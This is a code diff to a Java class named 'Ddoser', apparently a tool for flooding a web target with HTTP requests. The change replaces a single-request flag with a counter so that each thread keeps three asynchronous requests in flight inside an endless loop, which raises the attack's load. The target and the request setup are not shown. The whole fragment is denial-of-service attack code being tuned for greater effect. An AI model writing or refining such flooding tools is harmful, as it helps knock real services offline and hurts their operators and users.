@@ -20,6 +20,7 @@ import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 import java.util.concurrent.Future;
 import java.util.concurrent.atomic.AtomicBoolean;
+import java.util.concurrent.atomic.AtomicInteger;
 import java.util.concurrent.atomic.AtomicLong;
 
 public class Ddoser {
@@ -110,12 +111,11 @@ public class Ddoser {
 
         final AtomicBoolean isFirstCall = new AtomicBoolean(true);
         final AtomicBoolean isExeption = new AtomicBoolean(false);
-        final AtomicBoolean makeNewRequest = new AtomicBoolean(true);
+        final AtomicInteger callsPerThread = new AtomicInteger(3);
 
         while (true) {
-
-            if (makeNewRequest.get()) {
-                makeNewRequest.set(false);
+            if (callsPerThread.get() != 0) {
+                callsPerThread.decrementAndGet();
                 httpClient.sendAsync(request, HttpResponse.BodyHandlers.ofString()).thenApply(resp -> {
                     final long calls = successfulCalls.incrementAndGet();
                     if (calls % 10 == 0) {
@@ -131,11 +131,11 @@ public class Ddoser {
                                 resp.statusCode());
                         isFirstCall.set(false);
                     }
-                    makeNewRequest.set(true);
+                    callsPerThread.incrementAndGet();
                     return resp;
                 }).exceptionally(throwable -> {
                     isExeption.set(true);
-                    makeNewRequest.set(true);
+                    callsPerThread.incrementAndGet();
                     throw new IllegalArgumentException();
                 });
 
